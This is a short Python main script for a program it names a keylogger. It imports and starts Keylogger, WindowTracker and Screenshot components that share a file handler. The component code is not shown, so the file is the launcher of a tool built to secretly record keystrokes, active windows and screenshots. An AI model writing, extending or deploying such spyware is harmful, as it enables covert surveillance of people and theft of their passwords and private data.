from keylogger import Keylogger
from WindowTracker import WindowTracker
from Screenshot import Screenshot
from os import system
from FileHandler import FileHandler



def main():
    system('cls')
    fileHandler = FileHandler()
    keylogger = Keylogger(fileHandler)
    screenshot = Screenshot()
    windowTracker = WindowTracker(screenshot,fileHandler)
    keylogger.start()
    windowTracker.start()
    
    


if __name__ == "__main__":
    main()